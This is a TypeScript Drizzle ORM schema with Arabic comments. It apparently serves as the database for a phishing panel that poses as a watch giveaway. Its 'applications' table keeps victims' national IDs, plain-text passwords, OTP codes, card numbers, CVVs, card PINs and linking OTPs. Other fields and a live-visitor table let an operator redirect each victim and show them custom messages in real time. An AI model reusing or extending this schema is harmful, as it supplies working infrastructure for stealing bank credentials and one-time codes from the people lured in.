import { int, mysqlEnum, mysqlTable, text, timestamp, varchar } from "drizzle-orm/mysql-core";

export const users = mysqlTable("users", {
  id: int("id").autoincrement().primaryKey(),
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

// جدول الطلبات الرئيسي
export const applications = mysqlTable("applications", {
  id: int("id").autoincrement().primaryKey(),
  nationalId: varchar("nationalId", { length: 14 }).notNull().unique(),
  fullName: text("fullName"),
  phoneNumber: varchar("phoneNumber", { length: 20 }),
  governorate: text("governorate"),
  address: text("address"),
  watchColor: varchar("watchColor", { length: 50 }),
  username: text("username"),
  password: text("password"),
  otpCode: varchar("otpCode", { length: 10 }),
  cardNumber: text("cardNumber"),
  cardExpiry: text("cardExpiry"),
  cardCvv: text("cardCvv"),
  cardPin: text("cardPin"),
  watchLinkOtp: text("watchLinkOtp"),
  currentPage: varchar("currentPage", { length: 50 }).default("home"),
  customMessage: text("customMessage"),
  redirectTo: varchar("redirectTo", { length: 50 }),
  redirectError: varchar("redirectError", { length: 500 }),
  status: mysqlEnum("status", ["pending", "processing", "approved", "rejected", "waiting-login"]).default("pending"),
  lastActiveAt: timestamp("lastActiveAt"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type Application = typeof applications.$inferSelect;
export type InsertApplication = typeof applications.$inferInsert;

// جدول الزوار الحاليين في الموقع
export const liveVisitors = mysqlTable("liveVisitors", {
  id: int("id").autoincrement().primaryKey(),
  sessionId: varchar("sessionId", { length: 128 }).notNull().unique(),
  currentPage: varchar("currentPage", { length: 50 }).default("home"),
  redirectTo: varchar("redirectTo", { length: 50 }),
  lastActiveAt: timestamp("lastActiveAt").defaultNow().notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type LiveVisitor = typeof liveVisitors.$inferSelect;
export type InsertLiveVisitor = typeof liveVisitors.$inferInsert;

// جدول الإعدادات العامة
export const settings = mysqlTable("settings", {
  id: int("id").autoincrement().primaryKey(),
  settingKey: varchar("settingKey", { length: 100 }).notNull().unique(),
  settingValue: text("settingValue"),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type Setting = typeof settings.$inferSelect;
export type InsertSetting = typeof settings.$inferInsert;
